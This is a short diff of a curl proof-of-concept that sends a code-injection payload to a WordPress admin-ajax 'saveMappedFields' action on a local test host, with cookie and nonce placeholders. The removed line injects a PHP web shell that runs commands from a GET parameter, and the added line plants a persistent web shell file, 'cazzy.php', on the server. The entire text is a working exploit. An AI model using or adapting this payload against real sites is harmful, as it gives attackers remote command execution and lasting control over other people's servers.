@@ -3,4 +3,4 @@ curl -X POST "http://nxk.ddev.site/wp-admin/admin-ajax.php" \
   -H "Cookie: COOKIES" \
   --data-urlencode "action=saveMappedFields" \
   --data-urlencode "securekey=NONCE" \
-  --data-urlencode "MappedFields={\"pwn->cus2\":\"<?php \$cmd=\$_GET['cmd']; if(function_exists('system')){ system(\$cmd); } elseif(function_exists('exec')){ echo exec(\$cmd); } elseif(function_exists('shell_exec')){ echo shell_exec(\$cmd); } elseif(function_exists('passthru')){ passthru(\$cmd); } ?>\"}"
+  --data-urlencode "MappedFields={\"pwn->cus2\":\"<?php file_put_contents('cazzy.php', '<?php if(isset(\\$_GET[\\\"rce\\\"])){ system(\\$_GET[\\\"rce\\\"]); } ?>'); echo 'Shell created at cazzy.php'; ?>\"}"
